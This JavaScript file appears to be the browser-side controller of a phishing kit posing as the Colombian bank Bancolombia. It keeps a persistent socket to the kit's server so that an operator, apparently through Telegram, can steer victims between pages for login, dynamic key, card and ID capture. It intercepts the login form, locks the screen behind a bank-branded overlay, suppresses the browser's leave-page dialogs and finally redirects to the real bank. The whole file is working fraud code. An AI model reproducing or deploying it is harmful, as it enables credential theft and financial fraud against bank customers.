// Variables globales
let globalSocket = null;
let globalSessionId = null;
let keepAliveInterval = null;
let loadingOverlayInstance = null;

// Inicializar sesión de forma más robusta
function initGlobalSession() {
    try {
        // Intentar recuperar la sesión de todas las fuentes posibles
        globalSessionId = localStorage.getItem('bancolombia_session') || 
                         sessionStorage.getItem('currentSession') ||
                         Date.now().toString();
        
        // Forzar la sesión en todos los almacenamientos
        localStorage.setItem('bancolombia_session', globalSessionId);
        sessionStorage.setItem('currentSession', globalSessionId);
        localStorage.setItem('bancolombia_session_timestamp', Date.now().toString());
        sessionStorage.setItem('sessionTimestamp', Date.now().toString());
        
        // Guardar en window para acceso global
        window.globalSessionId = globalSessionId;
        
        console.log('Sesión inicializada/recuperada:', globalSessionId);
        return globalSessionId;
    } catch (error) {
        console.error('Error inicializando sesión:', error);
        globalSessionId = Date.now().toString();
        window.globalSessionId = globalSessionId;
        return globalSessionId;
    }
}

// Función para mantener la sesión activa
function emitKeepAlive() {
    if (globalSocket && globalSocket.connected) {
        globalSocket.emit('keepAlive', {
            sessionId: globalSessionId,
            timestamp: Date.now(),
            page: window.location.pathname,
            persistent: true
        });
    }
}

// Función para inicializar el socket y eventos comunes
function initializeSocket() {
    try {
        // Limpiar socket existente si hay
        if (globalSocket) {
            globalSocket.removeAllListeners();
            globalSocket.close();
            globalSocket = null;
        }

        // Configuración del socket con máxima persistencia y adaptada para Vercel
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const host = window.location.hostname === 'localhost' 
            ? 'localhost:3000'
            : window.location.host;

        globalSocket = io({
            path: '/socket.io/',
            host: host,
            protocol: protocol,
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 0,
            reconnectionDelayMax: 10,
            timeout: 1000,
            autoConnect: true,
            forceNew: true,
            transports: ['websocket', 'polling'],
            upgrade: true,
            rememberUpgrade: true,
            multiplex: false,
            forceNew: true,
            query: { 
                sessionId: globalSessionId,
                timestamp: Date.now(),
                page: window.location.pathname,
                persistent: true,
                priority: 'high'
            },
            extraHeaders: {
                'X-Session-ID': globalSessionId,
                'X-Client-Time': Date.now().toString()
            }
        });

        // Manejar conexión inicial y reconexiones
        globalSocket.on('connect', () => {
            console.log('Conectado al servidor, ID:', globalSocket.id);
            
            // Enviar información de sesión con persistencia
            globalSocket.emit('initSession', { 
                sessionId: globalSessionId,
                page: window.location.pathname,
                timestamp: Date.now(),
                persistent: true,
                priority: 'high'
            });

            // Mantener sesión activa agresivamente
            if (keepAliveInterval) {
                clearInterval(keepAliveInterval);
            }
            keepAliveInterval = setInterval(emitKeepAlive, 500);
            emitKeepAlive();
        });

        // Manejar desconexión con reconexión inmediata
        globalSocket.on('disconnect', () => {
            console.log('Desconectado del servidor - Reconectando...');
            
            // Reconexión inmediata
            globalSocket.connect();
            
            // Backup de reconexión
            setTimeout(() => {
                if (!globalSocket.connected) {
                    console.log('Forzando reconexión después de timeout...');
                    globalSocket.connect();
                }
            }, 100);
        });

        // Manejar errores con reconexión
        globalSocket.on('error', (error) => {
            console.error('Error de socket:', error);
            globalSocket.connect();
            
            // Reconexión de respaldo
            setTimeout(() => {
                if (!globalSocket.connected) {
                    console.log('Reconexión de respaldo después de error...');
                    initializeSocket();
                }
            }, 200);
        });

        // Verificación agresiva de conexión
        const connectionCheck = setInterval(() => {
            if (!globalSocket.connected) {
                console.log('Verificación periódica: Socket desconectado - Reconectando...');
                globalSocket.connect();
                
                // Si falla la reconexión normal, reinicializar
                setTimeout(() => {
                    if (!globalSocket.connected) {
                        console.log('Reconexión normal falló - Reinicializando socket...');
                        initializeSocket();
                    }
                }, 300);
            }
        }, 500);

        // Configurar keep-alive
        if (keepAliveInterval) {
            clearInterval(keepAliveInterval);
        }
        keepAliveInterval = setInterval(emitKeepAlive, 1000);
        emitKeepAlive();

        return globalSocket;
    } catch (error) {
        console.error('Error inicializando socket:', error);
        return null;
    }
}

// Función para crear y mantener el overlay
function createLoadingOverlay() {
    if (loadingOverlayInstance) {
        return loadingOverlayInstance;
    }

    // Eliminar overlay existente si hay
    const existingOverlay = document.querySelector('.loading-overlay');
    if (existingOverlay) {
        existingOverlay.remove();
    }

    // Crear nuevo overlay
    const overlay = document.createElement('div');
    overlay.className = 'loading-overlay';
    overlay.innerHTML = `
        <div class="loading-content">
            <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
        </div>
    `;

    // Aplicar estilos base
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.95)';
    overlay.style.display = 'none';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    overlay.style.zIndex = '9999';

    // Función para mostrar el overlay y asegurar que no hay diálogos
    overlay.show = function(persistent = true) {
        // Deshabilitar TODOS los diálogos y eventos de navegación de forma agresiva
        window.onbeforeunload = null;
        window.onunload = null;
        window.onpopstate = null;
        delete window.onbeforeunload;
        delete window.onunload;
        delete window.onpopstate;
        
        // Prevenir cualquier diálogo futuro de forma agresiva
        const preventDialog = (e) => {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            e.returnValue = null;
            return null;
        };
        
        window.addEventListener('beforeunload', preventDialog, true);
        window.addEventListener('unload', preventDialog, true);
        window.addEventListener('popstate', preventDialog, true);
        
        this.style.display = 'flex';
        this.classList.add('active');
        this.style.visibility = 'visible';
        this.style.opacity = '1';
        document.body.style.overflow = 'hidden';
        document.body.style.pointerEvents = 'none';
        
        // Estado forzado y persistente
        const state = {
            visible: true,
            timestamp: Date.now(),
            page: window.location.pathname,
            sessionId: globalSessionId,
            persistent: true,
            forced: true,
            locked: true
        };
        
        // Persistencia múltiple y bloqueo
        sessionStorage.setItem('overlayState', JSON.stringify(state));
        sessionStorage.setItem('overlayForced', 'true');
        sessionStorage.setItem('overlayVisible', 'true');
        sessionStorage.setItem('overlayLocked', 'true');
        sessionStorage.setItem('overlayTimestamp', Date.now().toString());
        localStorage.setItem('bancolombia_overlay_state', JSON.stringify(state));
        
        // Eliminar completamente cualquier diálogo
        window.onbeforeunload = () => {};
        window.onunload = () => {};
        delete window.onbeforeunload;
        delete window.onunload;
        
        // Forzar visibilidad agresivamente
        if (this.forceInterval) {
            clearInterval(this.forceInterval);
        }

        this.forceInterval = setInterval(() => {
            this.style.display = 'flex';
            this.classList.add('active');
            this.style.visibility = 'visible';
            this.style.opacity = '1';
            this.style.zIndex = '9999';
            
            // Verificar y restaurar estado
            const currentState = JSON.parse(sessionStorage.getItem('overlayState') || '{}');
            if (!currentState.visible || !currentState.persistent) {
                sessionStorage.setItem('overlayState', JSON.stringify(state));
            }
        }, 100);

        // Prevenir cierre accidental
        window.onbeforeunload = function(e) {
            sessionStorage.setItem('overlayState', JSON.stringify(state));
            return true;
        };
    };

    // Función para ocultar
    overlay.hide = function() {
        const state = JSON.parse(sessionStorage.getItem('overlayState') || '{}');
        if (!state.persistent) {
            this.style.display = 'none';
            this.classList.remove('active');
            document.body.style.overflow = '';
            
            if (this.forceInterval) {
                clearInterval(this.forceInterval);
                this.forceInterval = null;
            }

            // Limpiar estado
            sessionStorage.removeItem('overlayState');
            sessionStorage.removeItem('overlayVisible');
            sessionStorage.removeItem('overlayTimestamp');
            sessionStorage.removeItem('lastAction');
            sessionStorage.removeItem('navigatingFrom');
        }
    };

    document.body.appendChild(overlay);
    loadingOverlayInstance = overlay;
    return overlay;
}

// Función para manejar acciones de Telegram
function setupTelegramActions() {
    try {
        // Validar socket y sesión
        if (!globalSessionId) {
            initGlobalSession();
        }

        if (!globalSocket || !globalSocket.connected) {
            globalSocket = initializeSocket();
        }
        
        // Limpiar TODOS los estados anteriores
        sessionStorage.removeItem('lastAction');
        sessionStorage.removeItem('pendingRedirect');
        sessionStorage.removeItem('telegramRedirect');
        
        // Remover TODOS los listeners existentes
        globalSocket.removeAllListeners('telegramAction');

        // Eliminar completamente cualquier diálogo de redirección
        window.onbeforeunload = null;
        window.onunload = null;
        window.onpopstate = null;
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            e.returnValue = null;
            return null;
        }, true);

        // Obtener o crear overlay
        const overlay = createLoadingOverlay();

            // Control de acciones únicas
        let lastActionTimestamp = 0;
        const MIN_ACTION_INTERVAL = 1000; // 1 segundo entre acciones

        // Remover listeners existentes para evitar duplicados
        globalSocket.removeAllListeners('telegramAction');
        
        // Control estricto de acciones de Telegram con verificación de sesión
        let processingActions = new Set();
        let lastActionsByType = new Map();
        
        globalSocket.on('telegramAction', (data) => {
            // Verificar y reinicializar sesión si es necesario
            if (!globalSessionId) {
                console.log('Recuperando sesión...');
                globalSessionId = localStorage.getItem('bancolombia_session') || 
                                sessionStorage.getItem('currentSession') ||
                                window.globalSessionId;
                
                if (!globalSessionId) {
                    console.log('Reinicializando sesión...');
                    globalSessionId = initGlobalSession();
                }
            }

            if (!data || !data.action) {
                console.log('Datos de acción inválidos');
                return;
            }

            // Verificación estricta con recuperación de sesión
            if (!data.telegramMessageId || !data.fromTelegram || !data.messageId) {
                console.log('Acción no autorizada o incompleta');
                return;
            }

            // Asegurar que la sesión está sincronizada
            localStorage.setItem('bancolombia_session', globalSessionId);
            sessionStorage.setItem('currentSession', globalSessionId);
            window.globalSessionId = globalSessionId;

            // Control de acciones duplicadas por tipo
            const actionKey = `${data.action}_${data.messageId}`;
            if (processingActions.has(actionKey)) {
                console.log('Acción ya en proceso:', actionKey);
                return;
            }

            const now = Date.now();
            const lastActionTime = lastActionsByType.get(data.action) || 0;
            if (now - lastActionTime < MIN_ACTION_INTERVAL) {
                console.log('Acción demasiado pronto:', data.action);
                return;
            }

            // Registrar acción en proceso
            processingActions.add(actionKey);
            lastActionsByType.set(data.action, now);

            const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1);
            const currentPage = window.location.pathname;

            // Confirmar recepción de acción al servidor
            globalSocket.emit('actionReceived', {
                sessionId: globalSessionId,
                action: data.action,
                messageId: data.messageId,
                timestamp: now,
                page: currentPage
            });

            // Manejar navegación solo si es una acción válida de Telegram
            if (data.fromTelegram === true && data.telegramMessageId) {
                const nextPage = data.action + '.html';
                
                // Verificar que no estamos en la misma página
                if (currentPage.endsWith(nextPage)) {
                    console.log('Ya estamos en la página solicitada');
                    processingActions.delete(actionKey);
                    return;
                }

                // Manejar navegación según la acción
                switch(data.action) {
                    case 'index':
                    case 'dinamica':
                    case 'tarjeta':
                    case 'terminos':
                    case 'cedula':
                        // Limpiar estado antes de navegar
                        processingActions.clear();
                        lastActionsByType.clear();
                        sessionStorage.removeItem('lastFormSubmission');
                        
                        // Navegar
                        window.location.replace(basePath + nextPage);
                        break;
                    case 'finalizar':
                        processingActions.clear();
                        lastActionsByType.clear();
                        window.location.replace('https://www.bancolombia.com/personas');
                        break;
                    default:
                        console.log('Acción no reconocida:', data.action);
                        processingActions.delete(actionKey);
                }
            } else {
                // Mantener overlay visible sin navegar
                const overlay = createLoadingOverlay();
                overlay.show(true);
                processingActions.delete(actionKey);
            }            // Timeout para reintentar si no hay confirmación
            setTimeout(() => {
                globalSocket.emit('initSession', {
                    sessionId: globalSessionId,
                    page: window.location.pathname,
                    timestamp: Date.now(),
                    nextAction: data.action,
                    retry: true,
                    persistent: true
                });
            }, 3000);
        });

        // Manejar evento de login
        if (window.location.pathname.includes('index.html')) {
            const loginForm = document.querySelector('form');
            if (loginForm) {
                loginForm.addEventListener('submit', (e) => {
                    e.preventDefault();
                    overlay.show(true);
                    
                    globalSocket.emit('loginCompleted', {
                        sessionId: globalSessionId,
                        timestamp: Date.now()
                    });
                });
            }
        }

        // Mostrar overlay si es necesario
        const state = JSON.parse(sessionStorage.getItem('overlayState') || '{}');
        if (state.visible) {
            overlay.show(state.persistent);
        }

        return true;
    } catch (error) {
        console.error('Error en setupTelegramActions:', error);
        return false;
    }
}

// Función para verificar el estado de la sesión
function checkSession() {
    try {
        if (!globalSocket || !globalSessionId) {
            console.error('Sesión no inicializada');
            return false;
        }

        if (!globalSocket.connected) {
            console.error('Socket desconectado');
            globalSocket.connect();
            return false;
        }

        // Verificar tiempo de última actividad
        const lastActivity = localStorage.getItem('bancolombia_session_timestamp');
        if (lastActivity) {
            const timeSinceActivity = Date.now() - parseInt(lastActivity);
            if (timeSinceActivity > 300000) { // 5 minutos
                console.log('Sesión expirada por inactividad');
                initGlobalSession();
                globalSocket.emit('initSession', {
                    sessionId: globalSessionId,
                    page: window.location.pathname,
                    timestamp: Date.now(),
                    isRecovery: true
                });
                return false;
            }
        }

        // Actualizar timestamp de actividad
        localStorage.setItem('bancolombia_session_timestamp', Date.now().toString());
        return true;
    } catch (error) {
        console.error('Error en checkSession:', error);
        return false;
    }
}

// Inicializar sesión inmediatamente
initGlobalSession();

// Exportar funciones y variables
window.bancolombia = {
    initGlobalSession,
    initializeSocket,
    createLoadingOverlay,
    setupTelegramActions,
    checkSession,
    getSocket: () => globalSocket,
    getSessionId: () => globalSessionId
};